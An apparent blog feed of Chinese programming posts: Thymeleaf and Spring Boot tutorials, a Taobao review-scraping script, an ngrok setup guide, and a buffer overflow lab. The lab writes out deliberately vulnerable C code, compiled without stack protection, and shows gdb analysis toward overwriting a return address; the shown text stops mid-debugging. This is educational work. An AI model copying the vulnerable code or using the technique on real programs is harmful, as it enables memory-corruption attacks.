    <content type="text"><![CDATA[Thymeleaf是一个模板引擎，官方不推荐在Spring Boot项目中使用jsp来作为模板引擎，最主要的原因是jsp的写法不利于前端开发。Spring Boot官方推荐使用Thymeleaf作为模板引擎，在前端工具Vue和React大行其道的今天，使用模板引擎来渲染依然有它的用武之地，Thymeleaf简洁干练的表达式成为模板引擎中的一股清流。 快速上手1.引入依赖1compile('org.springframework.boot:spring-boot-starter-thymeleaf') 2.配置applicatio.yml(可选)Spring Boot默认为开发者做了配置，模板前缀在资源目录的templates目录下，后缀默认为.html,开发者默认可以无需做任何的配置 3.编写控制器12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455/** * 用户信息控制器 * @author 蓝士钦 */@Controller@RequestMapping("/user")public class UserController &#123; /** * 获取用户信息 * @param model 视图模型 * @return 模板名称 */ @GetMapping public String getUser(Model model)&#123; // 实例化一个用户信息对象，并设置对象属性值 User user = new User(); user.setName("蓝士钦"); user.setSex("男"); user.setAge(23); // 实例化一个集合，并添加集合元素 List&lt;Object&gt; stringList = new ArrayList&lt;&gt;(10); stringList.add(1); stringList.add(3.1415926); stringList.add(99999999L); stringList.add(null); stringList.add("Java"); // 实例化一个HashMap，并添加Map元素 Map&lt;String,Object&gt; objectMap = new HashMap&lt;&gt;(10); objectMap.put("姓名","蓝士钦"); objectMap.put("性别","男"); objectMap.put("年龄",23); // 通过视图模型的方法，向模板引擎传递用户信息对象 model.addAttribute("userInfo",user); // 通过视图模型的方法，向模板引擎传递ArrayList对象 model.addAttribute("strList",stringList); // 通过视图模型的方法，向模板引擎传递HashMap对象 model.addAttribute("objectMap",objectMap); // 通过视图模型的方法，向模板引擎传递字符串 model.addAttribute("info","用户信息"); // 通过视图模型的方法，向模板引擎传递数值类型 model.addAttribute("number",1314520); // 返回模板名称 return "userTpl"; &#125;&#125; 4.编写html模板在resources/templates/目录下新建userTpl.html1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title th:text="$&#123;info&#125;"&gt;&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;用户信息对象&lt;/p&gt;&lt;ul&gt; &lt;li th:text="$&#123;userInfo.name&#125;"&gt;&lt;/li&gt; &lt;li th:text="$&#123;userInfo.sex&#125;"&gt;&lt;/li&gt; &lt;li th:text="$&#123;userInfo.age&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;ArrayList对象&lt;/p&gt;&lt;ul th:each="item : $&#123;strList&#125;"&gt; &lt;li th:text="$&#123;item&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;HashMap对象&lt;/p&gt;&lt;ul th:each="item : $&#123;objectMap&#125;"&gt; &lt;li th:text="$&#123;item&#125;"&gt;&lt;/li&gt;&lt;/ul&gt;&lt;hr&gt;&lt;p&gt;字符串信息&lt;/p&gt;&lt;span th:text="$&#123;info&#125;"&gt;&lt;/span&gt;&lt;hr&gt;&lt;p&gt;数值信息&lt;/p&gt;&lt;span th:text="$&#123;number&#125;"&gt;&lt;/span&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt; 引入static静态资源目录下的js和css1234&lt;!--引入js--&gt;&lt;script th:src="@&#123;js/vue.js&#125;"&gt;&lt;/script&gt;&lt;!--引入css--&gt;&lt;link rel="stylesheet" th:href="@&#123;/css/bootstrap.css&#125;"/&gt; 在js中取值123&lt;script th:inline="javascript"&gt; var info =[[$&#123;info&#125;]];&lt;/script&gt; 详细的语法移步官方网站 https://www.thymeleaf.org/]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>后端 Thymeleaf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Spring Boot开发应用程序]]></title>
    <url>%2Fe31a6908%2F</url>
    <content type="text"><![CDATA[Spring Boot是一个开发框架，用来快速开发各种应用程序，目前用的最多的主要是后端服务的开发。Spring Boot使用特定的方式对Spring的模板化配置进行了简化，并且集成很多第三方库的默认配置。默认内置了Tomcat容器并且可以替换为其他容器，无需部署War文件，可以直接打成jar包独立运行。Spring Boot依赖于Spring家族的生态圈，你能想到的功能都应有尽有，总结起来就是：方便和快捷。 一、Spring Boot的主要特点 可以快速创建一个可独立运行的Spring程序 默认内置嵌入的Tomcat，不需要打包成War包依赖外部容器部署，可以直接打成jar包独立运行。 使用Maven或Gradle进行第三方库管理，并且做了简化。通过引入starter拥有Spring的全部功能，开箱即用。 支持自动配置，对很多第三方库提供默认配置，采用了“默认大于配置”的方式，可以做到零配置。 使用.yml .properties .xml对项目进行配置，通过不同的文件二级名称可以方便的在生产和开发环境切换。 从我开始使用Spring Boot时已经是1.5.6的版本了，到目前为止Spring Boot已经发布了2.0.2版本。之前比较忙，没有太多精力去记录，现在使用Spring Boot 2.0版本来记录学习过程。2.0的版本多了很多新特性，最大的亮点主要是Spring Framework 5.0的响应式编程。有关Spring Boot 2.0的新特性就不再详细的介绍，可以查阅官方文档。 二、开始使用Spring Boot使用Spring Boot到底有多简单？ 1.使用Gradle来构建一个普通的Java项目可以看到上面的App类中有一个入口main函数，在函数中打印 “Hello,World!”。点击运行就可以看到输出。接下来通过引入一个Spring Boot的依赖，实现零配置的Spring程序。 2.在项目的build.gradle文件中加入Spring Boot的web模块依赖1compile("org.springframework.boot:spring-boot-starter-web:2.0.2.RELEASE") 3.为入口类添加@SpringBootApplication注解，表示这是一个Spring Boot应用程序，然后在main函数中添加SpringApplication.run方法，传入启动类入口参数。1234567@SpringBootApplicationpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125;&#125; 通过以上三个步骤，就可以直接启动Spring Boot程序了。点击运行，控制台输出了启动日志，其中可以看到一条日志 Tomcat started on port(s): 8080，表示Tomcat启动完毕，默认占用的是8080端口，这是一个内嵌的Tomcat，后续可以高度定制。 为了可以在浏览器中访问到项目，我们需要添加一个控制器，并且提供访问地址和响应数据。为了方便这里直接在App类中添加,最终的App类如下所示：123456789101112131415161718/** * Spring Boot示例程序 * @author 蓝士钦 */@SpringBootApplication@Controllerpublic class App &#123; public static void main(String[] args) &#123; SpringApplication.run(App.class,args); &#125; @ResponseBody @RequestMapping("/hello") public String hello()&#123; return "Hello, Spring Boot!"; &#125;&#125; 在类上添加@Controller，表示这个类作为控制器层， 在类中添加一个方法hello，用来返回一个字符串。方法上的@RequestMapping(“/hello”)注解表示该方法可以响应用户的url请求为/hello。@responseBody注解的作用是将controller的方法返回的对象通过适当的转换器转换为指定的格式之后，写入到response对象的body区，通常用来返回JSON数据或者是XML。Spring Boot对@responseBody做了默认的配置，如果返回的是一个用户定义的对象，那么这个对象将会自动被解析成JSON输出。由于这里是字符串，所以浏览器访问这个方法时将直接输出字符串。打开浏览器输入 http://localhost:8080/hello 通过简单的3个步骤，就可以将普通的Java项目变成Web项目，通过浏览器可以直接访问到。如果返回的是用户自定义类型，在方法上面添加@ResponseBody将会以JSON的形式返回123456789@ResponseBody@RequestMapping("/info")public User info()&#123; User user = new User(); user.setName("蓝士钦"); user.setSex("男"); user.setAge(23); return user;&#125; 浏览器访问 http://localhost:8080/info 可以看到Spring Boot 默认为@ResponseBody注解添加了视图转换为JSON，开发人员可以不需要再单独配置，非常方便。然而Spring Boot的强大之处并不在这里，这才是刚刚开始。 三、使用正确的姿势创建Spring Boot项目 IntelliJ IDEA对Spring Boot的支持非常友好创建项目时选择Spring Initializ 即可创建Spring Boot项目。可以选择Maven或者Gradle来构建项目，Spring Boot目前支持Java、Kotlin、Groovy语言，这里使用Gradle来构建项目，语言选择使用Java。可以为Spring Boot项目添加第三方依赖，这些库也可以后续手动引入，目前就加一个web模块的依赖。项目构建好后可以看到如上图所示的结构。Spring Boot模板化了工程目录，无需任何配置就可以直接运行。 src/main模块下默认分为java源代码目录和resources资源目录src/main/java 用来存放Java代码resources/static/默认指定用来存放静态资源，比如images、css、js以及html等。resources/templates/表示模板目录，用来存放html模板，这里的文件资源默认需要通过控制器mvc的方式来访问。resources/application.properties是项目的配置文件。 Spring Boot默认已经帮我们做了各种配置了，可以根据需要进行单独配置，IDEA强大的静态代码分析功能可以给开发人员很智能的提示 修改了默认端口号为8000，上下文地址为/boot 在resources/static/目录下新建一个index.html，然后启动项目通过地址 http://localhost:8000/boot/index.html 即可访问到页面 Spring Boot 目前支持Thymeleaf 、Freemarker、Mustache、 Groovy Templates模板引擎。Spring Boot 很多用于api接口服务的开发，有时候也需要使用模板引擎来做渲染视图。官方不推荐使用jsp来做模板引擎，官方推荐使用 Thymeleaf来做视图模板引擎，使用前需要在build.gradle中添加Thymeleaf的依赖1compile('org.springframework.boot:spring-boot-starter-thymeleaf') Spring Boot 对Thymeleaf做了默认配置，prefix=classpath:/templates/ suffix=.html所以我们不需要在配置文件中配置，除非需要定制。在resources/templates/目录下新建模板页面 helloTpl.html12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;hello&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h2&gt;这是一个模板页面&lt;/h2&gt; &lt;div&gt; 控制器传过来的值为： &lt;span th:text="$&#123;message&#125;"&gt;&lt;/span&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; Thymeleaf模板引擎有很多便捷强大的表达式，这里只输出一个控制器传过来的message值，具体用法后续的文章再详细介绍。接下来在控制器中定义一个方法，向页面传值，并且返回一个模板名字名称helloTpl，Spring Boot会对该模板拼接上前后缀： 控制器方法将会返回 classpath:/templates/helloTpl.html12345678910111213/** * 控制器示例 * @author 蓝士钦 */@Controllerpublic class HelloController &#123; @RequestMapping("/hello") public String hello(Model model)&#123; model.addAttribute("message","Hello,World!"); return "helloTpl"; &#125;&#125; 访问页面 http://localhost:8000/boot/hello 就可以看到helloTpl模板被成功渲染输出了。 Spring Boot默认的配置文件为.properties，这种配置其实还不够简洁，现在很流行yml的配置我们可以把默认的配置文件删除，新建application.yml，Spring Boot在启动时默认会加载该配置文件。除此之外，我们本地开发的配置和测试服务器以及正式生产服务器肯定是有区别的，传统的Spring 项目从开发环境到测试环境和生产环境的切换时需要修改配置文件，一般通过注释的方式，这样很容易因为误操作导致配置文件的配置是错误的，Spring Boot为我们考虑到了这一点 为开发(dev)、测试(test)、生产（pro)环境分别建立不同的配置文件，在运行或打包时指定该配置即可。配置文件名称格式：application-自定义名称.yml在application.yml中指定加载的为dev，这样项目启动的时候就会加载application-dev.yml中的配置application.yml123spring: profiles: active: dev 在不同的配置文件中为项目设置不同的启动端口，以示区分application-dev.yml123# 开发环境server: port: 8100 application-test.yml123# 测试环境server: port: 8200 application-pro.yml123# 生产环境server: port: 8080 启动服务，项目加载application-dev.yml的开发环境配置，服务将会运行在8100端口。http://localhost:8100/info 修改配置文件application.yml 指定为测试环境。123spring: profiles: active: test 此时运行项目或者打成jar包运行时，项目将会加载测试环境的配置用Gradle build项目，将会在lib目录下生成一个jar包将jar包部署到测试环境，使用java -jar 命令直接运行1java -jar spring-boot-0.0.1-SNAPSHOT.jar 可以看到服务加载了测试环境的配置，运行在8200的端口上。 Spring Boot和传统的Spring开发相比，不需要繁琐的框架搭建配置，开发速度上有质的提升。Spring Boot还可以方便的和Hibernate与Mybatis等框架以及Redis、各种MQ集成，并且有默认的配置。开发者只需要少量的配置就可以快速使用各种框架来开发，灵活的在不同的环境切换。开发效率得到质的飞跃。 本篇文章记录Spring Boot的基本使用，行云流水的过了一遍，还有很多功能没有记录。每个功能点都写的不深，也不够详细，只是简单的使用，这里占时从宏观感受上先大致罗列，抽空再好好整理。后续我会分根据Spring Boot的不同方面，单独编写某个功能的文章来系统的记录Spring Boot的用法。]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>后端 SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编写爬虫分析商品评论内容]]></title>
    <url>%2F18296dc%2F</url>
    <content type="text"><![CDATA[最近看上一款很时尚的水杯，我要买的初衷就是因为杯子好看，但是我也很注重杯子的质量，比如是否有异味等。这款商品在淘宝上的评论有十几万条，里面掺杂着各种各样的评价，这么多评论一条一条的看显然是个笨方法，我的需求很简单，就是想马上知道这么多评论里究竟有多少人评论有异味。如果质量不过关，我马上换其他商品，这样可以节省我的购物时间。作为一只程序猿，这种体力劳动当然是要用编程来解决了，只需要写一个爬虫并且分析评论内容即可。 非常中意这款水杯，除了这几种款式还有其他的风格可以选择并且可以免费刻字，颜值已经达到了我的要求，就看质量如何了。我的目的就一个，编写程序来自动分析评论内容，得到我想要的结果，然后决定买不买。 编程的最终目的就是为了解决生活中的实际问题，让计算机代替人类去做一些重复性的工作。 在编写工具程序时，我用的最多的是Python，毋庸置疑他是目前用来编写工具程序效率最高的语言之一。Python凭借着简洁的语法和强大的第三方库，在运维、机器学习、以及自动化领域有着非常广泛的应用。 使用Python编写自动化程序有很多种方式，比如我之前用WebDriver库来控制浏览器进行自动化操作，这种方式基本上可以说是很暴力，一般的反爬虫手段对这种方法都没有很好的解决方案，因为他的的确确是真的浏览器在操作，不过WebDriver一般用来做浏览器端的自动化测试。爬虫程序一般是自己构造一个客户端去做网络请求，使用专门的库去做数据的获取和解析操作，比如XPath等。有些网页是通过ajax等方式来异步加载数据的，这时候就要分析并找出网页数据的调用接口，然后再用自己的程序去自动化调用。 通过分析淘宝的宝贝链接和评论页面的数据获取可以发现淘宝是采用异步调用数据的，返回的数据是json格式，所以这里用不到XPath，只需要调用接口并且解析json即可。 要做的步骤 编写爬虫根据宝贝链接爬取评论数据并保存到本地文件 分析评论数据里面的关键字得到感兴趣的内容 不说废话，上代码新建一个分析淘宝商品评论的工具类 taobao.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import requestsimport json# 获取商品评论def get_commodity_comments(order_url, file_name): # 获取商品评论信息，解析json数据 response_content = requests.get(order_url) response_json = json.loads(response_content.text.strip().strip('()')) # 商品评论条数 total = response_json['total'] # 当前评论所在页数 page = 1 # 当前评论所在行数 count = 0 # 打开指定文件，准备将请求到的数据写入到文件中 file = open(file_name, 'w') while count &lt; total: res = requests.get(order_url[:-1] + str(page)) page = page + 1 response_json = json.loads(res.text.strip().strip('()')) comments = response_json['comments'] if comments is None: return total for common_item in comments: file.writelines(common_item['user']['nick'] + '评论:' + common_item['content']) count = count + 1 # 关闭文件流 file.close() return total# 分析评论，统计关键字在评论里出现的次数def analysis_commodity(file_name, key): file = open(file_name, 'r') content = file.read() return content.count(key)def select_keyword_count(commodity_link, key_word): # 获取链接中的商品id order_id = commodity_link[commodity_link.find('&amp;id=') + 4:] # 根据商品id，查询评论接口 order_url = 'https://rate.taobao.com/feedRateList.htm?auctionNumId=' + order_id + '&amp;currentPageNum=1' # 获取商品评论，保存到指定文件，并且返回商品条数 total = get_commodity_comments(order_url, order_id + '.txt') # 根据关键字分析评论，得出分析结果 keyword_count = analysis_commodity(order_id + '.txt', key_word) return total, keyword_count 新建一个demo.py 用来测试刚刚写的工具类12345678910111213import taobaoif __name__ == '__main__': # 商品链接 commodity_link = 'https://detail.tmall.com/item.htm?spm=a220o.1000855.1000983.1.301635bfuvpObC&amp;id=557148927006' # 要查询的评论关键字 key_word = '有异味' # 执行查询返回结果 total, keyword_count = taobao.select_keyword_count(commodity_link, key_word) print('您选择的宝贝共有', str(total), '条评论', '其中有' + str(keyword_count), '人评论', key_word) 运行程序,程序根据商品链接中的商品id作为文件名，将评论数据写入了文件中。程序再次读入文件中的评论数据，对关键字进行统计。 通过控制台可以看到当前商品评论中有异味的有85条。然而简单的字符统计无法应对中华文化的博大精深， 有异味前面如果加个没,那就变成了没有异味这完全是相反的意思。这是一个包含关系，当前的结果里面可能包含了没有异味的评论。 这里本应该用到机器学习，但是在自然语言处理方面微软早已做了很多年了，对个人来说自己去训练数据集去理解用户的语义的成本是相当大的，TensorFlow我接触的不多，机器学习方面我可以说是一个小白，目前没有能力去写出这样一个卷积算法。不过如果就针对目前这当个词法而言却变得不那么复杂，完全可以通过程序多重判断来得出大致的结论。这里目前占时就low一点，修改关键词为没有异味再运行一次程序，然后把有异味减去没有异味，最后的结果就是有异味的评论。 可以看到没有异味的有80条评论，所以真正评论有异味的评论条数为 85-80=5 看一个商品的用户评价的时候，过多的关注正面评价一般没有多大意义，有可能很多是刷的虚假信息，但是负面评价一般是真实的用户评论，排除竞争对手的恶意评论，基本上只有用户在使用过程中遇到问题，很生气的情况下才会特意来对商品进行负面的评论，所以当喜欢一个商品要购买时，就尽可能多的在负面评论中参考，看看自己对这个东西的喜欢是否打过他的缺点。 经过统计，在122650条评论中只有5个人说杯子有异味，所以三个字 买买买！]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建ngrok服务器]]></title>
    <url>%2F38f11925%2F</url>
    <content type="text"><![CDATA[在开发的时候难免会遇到一些特殊场景，比如需要在测试服务器上进行远程调试。为了方便我们将工程使用Debug模式部署在测试服务器上，然后本地可以进行远程断点调试。但是这样做还是不够方便，比如开发者本地新增或者修改了代码，就没法实时进行远程断点调试了。目前最优解决方案就是把开发者自己的电脑当做测试服务器，搭建一个属于自己的ngrok服务器，实现内网穿透，外网通过绑定的域名进行访问，开发者就可以直接在本地进行微信开发。 很早之前在做微信开发的时候，我就已经在自己的Linux服务器上搭建好了ngrok，由于我自己使用的是苹果笔记本，所以ngrok编译的版本也是针对MacOS系统的，以前以为不会用到Windows系统，就没有编译，结果在工作中使用的是Windows系统。由于习惯了MacOS的开发环境和强大的触控板，在Windows上的我各种不适应。原本几分钟搞定的事搞了大半天。 为了后续开发方便，接下来我通过编译ngrok源码生成Windows版本的可执行程序。 准备工作 Git GoLang 一台拥有公网ip的服务器 一个绑定到公网ip服务器上的域名 Git和Golang的下载和安装很简单，不再阐述。这里顺便再安利一波GoLang，之前学过go，感觉在携程方面确实很强大。运行效率可以和C语言媲美，很适合系统编程（目前很火的区块链大多数用go写），开发效率也很快。还有真正的跨平台，这里从编译ngrok源码就可以看出来，go写的程序可以编译成目前主流平台的可执行程序。 好了，接下来步入正题。 步骤 下载ngrok源码 1git clone https://github.com/inconshreveable/ngrok.git 生成证书 (依次执行如下命令) 1234567export NGROK_DOMAIN="mac.lanshiqin.com"cd ngrokopenssl genrsa -out rootCA.key 2048openssl req -x509 -new -nodes -key rootCA.key -subj "/CN=$NGROK_DOMAIN" -days 5000 -out rootCA.pemopenssl genrsa -out server.key 2048openssl req -new -key server.key -subj "/CN=$NGROK_DOMAIN" -out server.csropenssl x509 -req -in server.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out server.crt -days 5000 上面 NGROK_DOMAIN的 值为自己的域名 将生成的客户端和服务端证书拷贝到对应资源目录下（这一步很重要）123cp rootCA.pem assets/client/tls/ngrokroot.crt cp server.crt assets/server/tls/snakeoil.crt cp server.key assets/server/tls/snakeoil.key 编译ngrok服务端（我的服务器是linux系统，所以这里指定编译成linux平台的可执行程序） 1234#32位Linux系统GOOS=linux GOARCH=386 make release-server#64位Linux系统GOOS=linux GOARCH=amd64 make release-server 编译ngrok客户端Mac版本 1GOOS=darwin GOARCH=amd64 make release-client Windows版本1GOOS=windows GOARCH=amd64 make release-client 编译之后，在ngrok源码的bin目录下生成了对应不同平台的ngrok可执行程序 为了启动方便，新建一个ngrok.cfg配置文件12server_addr: &quot;mac.lanshiqin.com:4443&quot;trust_host_root_certs: false 为Windows平台新建一个startup.bat文件123@echo oncd %cd%ngrok -config=ngrok.cfg -log=ngrok.log -subdomain=mac 9000 ngrok服务端启动1./ngrokd -domain="lanshiqin.com" -httpAddr=":80" &amp; 启动MacOS上的ngrok客户端(最后的端口号为本地端口号，可以指定为其他任意端口)1./ngrok -config=./ngrok.cfg -subdomain=mac 9000 发现成功连接上ngrok服务器，这时外网就可以通过访问域名 http://mac.lanshiqin.com 来访问本机了 发现成功连接上ngrok服务器。我们本机9000端口运行一个程序，通过 http://mac.lanshiqin.com 域名访问来验证一下ngrok服务是否可用 发现外网可以通过域名访问到本机对应端口上的服务，到此私人ngrok服务搭建完毕。]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>网络 工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓冲区溢出攻击实验]]></title>
    <url>%2Fe2f22ec7%2F</url>
    <content type="text"><![CDATA[缓冲区溢出是指向程序缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被攻击者利用来改变程序的流程控制，甚至执行代码的任意片段。缓冲区溢出攻击成为远程攻击的主要手段，攻击者利用缓冲区溢出漏洞可以植入并且执行任意的攻击代码，缓冲区溢出漏洞给予了攻击者想要的一切，甚至得到被攻击计算机的控制权。 缓冲区溢出漏洞能够被利用的主要原因是计算机采用了“冯·诺依曼体系结构”，该体系结构把程序指令也当做数据来对待，指令和数据不加区分混合存储在同一个存储器中，数据和程序在内存中是没有区别的,它们都是内存中的数据,当EIP指针指向哪 CPU就加载那段内存中的数据。这就造成数据存在覆盖指令的情况，如果数据指向一个内存地址并且覆盖了EIP指针所指向的地址，那么程序就会跳转到攻击者指定的代码段执行。 概念部分：计算机程序被CPU执行前需要先被载入内存，程序所在的内存由操作系统进行分配，程序内部使用的变量或者接收用户输入的数据都需要分配内存，这块内存区域也叫做缓冲区，程序被载入到内存后的结构如下图绿色区域所示：一个程序占用着一块内存区域，这块区域包含了程序函数的调用栈，数据，缓冲区等。如果向缓冲区写入超出长度的数据，那么数据将会覆盖到程序的其他内存区域，如果函数调用栈里某个函数地址被覆盖成其他函数地址，那么这个程序执行流程将会被改变，将会执行覆盖数据指定地址的函数。更为严重的是如果被植入精心构造的恶意代码并执行，攻击者将会得到运行该程序的用户权限，如果该程序以root角色执行，那么攻击者就可以得到目标计算机的完全控制权。 要做的事： 用C语言编写一个具有缓冲区溢出漏洞的程序，程序的功能是从main函数参数接收用户输入的数据，并且输出到控制台。 使用gcc将源代码编译成32位的可执行程序，并使用gdb调试并断点分析程序运行。 运行程序并向程序输入超过缓冲区大小的数据，对第二步调试分析得到的目标函数地址进行覆盖，将函数地址覆盖成另一个函数地址，使程序执行其他函数。 使用的系统和工具： Ubuntu Linux 16.04（64位）操作系统 vim,gcc,gdb,gcc-multilib(32位程序所需的编译工具)其中gcc和gdb在Ubuntu中已经内置，vim和编译32位程序所需的gcc编译器需要另外安装12sudo apt-get install vimsudo apt-get install gcc-multilib 实验部分：使用vim新建一个main.c 源代码文件12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;string.h&gt;void hello()&#123; printf("hello\n");&#125;int fun(char *str)&#123; char buf[10]; strcpy(buf, str); printf("%s\n", buf); return 0;&#125;int main(int argc, char **argv)&#123; char *str = argv[1]; fun(str); return 0;&#125; 上面的代码通过main()函数参数接收用户输入数据，并调用fun()函数将输入的数据str拷贝给buf缓冲区，最后将buf缓冲区的字符输出。可以看到上面的代码定义了一个字符数组为10个字节大小的buf缓冲区，并使用strcpy将str数据直接拷贝到buf缓冲区，并没有对数据长度进行判断，如果用户输入了超过10个字符的数据，那么将会产生缓冲区溢出。 上面的代码并没有调用函数hello(),我们可以利用缓冲区漏洞，让程序调用函数hello()。使用gcc将源代码编译成可执行程序1gcc -m32 -z execstack -fno-stack-protector -g -o main main.c 为了方便实验进行，上面的gcc编译指令后面跟了一些编译参数： -m32 将程序编译成32位程序 -z execstack 允许栈执行 -fno-stack-protector 关闭gcc的Stack Guard -g 为了gdb程序能够调试程序（方便后续的结合源代码断点调试） -o 输出目标文件为指定文件 编译后可以看到已经生成了可执行程序 main, 输入命令运行程序 并且后面跟上参数AAAA1./main AAAA 可以看到控制台成功输出了输入的AAAA 如果用户输入超过长度的字符，发现程序执行后会报段错误 接下来使用gdb调试目标程序1gdb ./main 在gdb模式下,可以使用disass命令查看程序中各个函数的汇编代码依次查看程序中的 hello()函数 fun()函数 main()函数的汇编代码 汇编代码如下所示:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657(gdb) disass helloDump of assembler code for function hello: 0x0804843b &lt;+0&gt;: push %ebp 0x0804843c &lt;+1&gt;: mov %esp,%ebp 0x0804843e &lt;+3&gt;: sub $0x8,%esp 0x08048441 &lt;+6&gt;: sub $0xc,%esp 0x08048444 &lt;+9&gt;: push $0x8048540 0x08048449 &lt;+14&gt;: call 0x8048310 &lt;puts@plt&gt; 0x0804844e &lt;+19&gt;: add $0x10,%esp 0x08048451 &lt;+22&gt;: nop 0x08048452 &lt;+23&gt;: leave 0x08048453 &lt;+24&gt;: ret End of assembler dump.(gdb) disass funDump of assembler code for function fun: 0x08048454 &lt;+0&gt;: push %ebp 0x08048455 &lt;+1&gt;: mov %esp,%ebp 0x08048457 &lt;+3&gt;: sub $0x18,%esp 0x0804845a &lt;+6&gt;: sub $0x8,%esp 0x0804845d &lt;+9&gt;: pushl 0x8(%ebp) 0x08048460 &lt;+12&gt;: lea -0x12(%ebp),%eax 0x08048463 &lt;+15&gt;: push %eax 0x08048464 &lt;+16&gt;: call 0x8048300 &lt;strcpy@plt&gt; 0x08048469 &lt;+21&gt;: add $0x10,%esp 0x0804846c &lt;+24&gt;: sub $0xc,%esp 0x0804846f &lt;+27&gt;: lea -0x12(%ebp),%eax 0x08048472 &lt;+30&gt;: push %eax 0x08048473 &lt;+31&gt;: call 0x8048310 &lt;puts@plt&gt; 0x08048478 &lt;+36&gt;: add $0x10,%esp 0x0804847b &lt;+39&gt;: mov $0x0,%eax 0x08048480 &lt;+44&gt;: leave 0x08048481 &lt;+45&gt;: ret End of assembler dump.(gdb) disass mainDump of assembler code for function main: 0x08048482 &lt;+0&gt;: lea 0x4(%esp),%ecx 0x08048486 &lt;+4&gt;: and $0xfffffff0,%esp 0x08048489 &lt;+7&gt;: pushl -0x4(%ecx) 0x0804848c &lt;+10&gt;: push %ebp 0x0804848d &lt;+11&gt;: mov %esp,%ebp 0x0804848f &lt;+13&gt;: push %ecx 0x08048490 &lt;+14&gt;: sub $0x14,%esp 0x08048493 &lt;+17&gt;: mov %ecx,%eax 0x08048495 &lt;+19&gt;: mov 0x4(%eax),%eax 0x08048498 &lt;+22&gt;: mov 0x4(%eax),%eax 0x0804849b &lt;+25&gt;: mov %eax,-0xc(%ebp) 0x0804849e &lt;+28&gt;: sub $0xc,%esp 0x080484a1 &lt;+31&gt;: pushl -0xc(%ebp) 0x080484a4 &lt;+34&gt;: call 0x8048454 &lt;fun&gt; 0x080484a9 &lt;+39&gt;: add $0x10,%esp 0x080484ac &lt;+42&gt;: mov $0x0,%eax 0x080484b1 &lt;+47&gt;: mov -0x4(%ebp),%ecx 0x080484b4 &lt;+50&gt;: leave 0x080484b5 &lt;+51&gt;: lea -0x4(%ecx),%esp 0x080484b8 &lt;+54&gt;: ret End of assembler dump.(gdb) 可以看到其中hello函数的首地址是 0x0804843b，缓冲区溢出的时候会用到0x0804843b。除此之外还可以看到main函数调用fun函数call的地址是0x080484a4,call后的下面一条指令地址是0x080484a9，这些指令地址都将会放在CPU寄存器里，待会断点调试的时候可以看到。 输入l命令列出程序源码：123456789101112131415161718192021(gdb) l5 &#123;6 printf("hello\n");7 &#125;8 9 int fun(char *str)10 &#123;11 char buf[10];12 strcpy(buf, str);13 printf("%s\n", buf);14 return 0;(gdb) 15 &#125;16 17 int main(int argc, char **argv)18 &#123;19 char *str = argv[1];20 fun(str);21 return 0;22 &#125;(gdb) 使用 b命令进行断点，我们将断点设置在13行和20行，看看调用fun函数时和printf输出时寄存器内的数据。12345(gdb) b 13Breakpoint 1 at 0x804846c: file main.c, line 13.(gdb) b 20Breakpoint 2 at 0x804849e: file main.c, line 20.(gdb) 输入数据AAAA运行，查看寄存器ebp和esp的数据:1234567891011(gdb) r AAAAStarting program: /home/lanshiqin/桌面/main AAAABreakpoint 2, main (argc=2, argv=0xffffd084) at main.c:2020 fun(str);(gdb) x/x $ebp0xffffcfd8: 0x00000000(gdb) x/8x $esp0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd2890xffffcfd0: 0xf7fb83dc 0xffffcff0 0x00000000 0xf7e20637(gdb) 可以看到程序先执行到了fun函数所在的断点位置，此时fun函数接收的参数str应该是输入的数据AAAA使用p命令查看str的地址123(gdb) p str$1 = 0xffffd289 "AAAA"(gdb) 使用si命令单步运行，然后查看寄存器数据1234567891011(gdb) si0x080484a1 20 fun(str);(gdb) x/8x $esp0xffffcfb4: 0x00000001 0xf7e36830 0x0804850b 0x000000020xffffcfc4: 0xffffd084 0xffffd090 0xffffd289 0xf7fb83dc(gdb) si0x080484a4 20 fun(str);(gdb) x/8x $esp0xffffcfb0: 0xffffd289 0x00000001 0xf7e36830 0x0804850b0xffffcfc0: 0x00000002 0xffffd084 0xffffd090 0xffffd289(gdb) 可以看到str地址`0xffffd289’已经压入栈中继续si单步运行，查看寄存器数据 1234567(gdb) sifun (str=0xffffd289 "AAAA") at main.c:1010 &#123;(gdb) x/8x $esp0xffffcfac: 0x080484a9 0xffffd289 0x00000001 0xf7e368300xffffcfbc: 0x0804850b 0x00000002 0xffffd084 0xffffd090(gdb) 可以看到call后面的一条指令地址0x080484a9也已经压入栈中使用n单步运行，到达13行断点位置，查看寄存器内容12345678910(gdb) n12 strcpy(buf, str);(gdb) nBreakpoint 1, fun (str=0xffffd289 "AAAA") at main.c:1313 printf("%s\n", buf);(gdb) x/8x $esp0xffffcf90: 0xffffffff 0x4141002f 0xf7004141 0xf7fd41a80xffffcfa0: 0x00008000 0xf7fb8000 0xffffcfd8 